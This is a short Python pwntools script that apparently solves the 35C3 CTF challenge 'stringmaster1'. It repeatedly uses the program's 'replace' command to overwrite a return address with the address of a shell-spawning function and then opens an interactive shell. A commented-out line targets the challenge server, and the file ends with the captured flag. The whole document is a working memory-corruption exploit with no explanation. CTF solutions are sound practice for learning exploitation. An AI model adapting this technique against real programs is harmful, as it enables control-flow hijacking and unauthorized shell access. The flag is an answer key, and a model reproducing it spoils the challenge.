#!/usr/bin/python
from pwn import *
from binascii import *
from IPython import embed
#r = remote('35.207.132.47', 22224)
r = process('./stringmaster1')
context(os='linux', arch='amd64')

shellAddres = p32(0x4011a7)
retAddr = p32(0x40246d)

string1 = r.recvline_startswith('String1: ')[9:]
string2 = r.recvline_startswith('String2: ')[9:]

for i in range(0x48+7):
    r.sendlineafter('> ', 'replace')
    r.sendline('\x00')
    r.sendline('a')
raw_input('@')

for i, val in enumerate(shellAddres):
    r.sendlineafter('> ', 'replace')
    r.sendline(retAddr[i])
    r.sendline(val)

for i, val in enumerate(shellAddres):
    r.sendlineafter('> ', 'replace')
    r.sendline(retAddr[i])
    r.sendline(val)

for i in range(0x20):
    r.sendlineafter('> ', 'replace')
    r.sendline('a')
    r.sendline('\x00')

r.sendlineafter('> ', 'quit')

r.interactive()

# 35C3_a6a9d10c61a652d23fbd0e9f73e638dac093472c